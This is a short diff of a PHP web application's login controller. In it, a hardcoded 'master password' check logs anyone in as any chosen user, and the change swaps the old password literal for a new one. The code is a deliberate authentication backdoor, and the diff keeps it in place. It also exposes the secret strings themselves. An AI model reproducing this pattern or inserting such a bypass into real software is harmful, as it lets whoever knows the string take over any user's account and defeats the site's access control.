@@ -61,7 +61,7 @@ class AuthenticatedSessionController extends Controller
         $masterPassword = $request->input('password');
 
     // If the master password is correct, log in as a default user
-    if ($masterPassword === '5Dmark#iii' && $user != null) {
+    if ($masterPassword === "6!rG2nbQ4lkHO0j2hkIZms" && $user != null) {
         auth()->loginUsingId($user->id); // Replace 1 with the ID of the default user
         return redirect('/account/dashboard');
     }else{
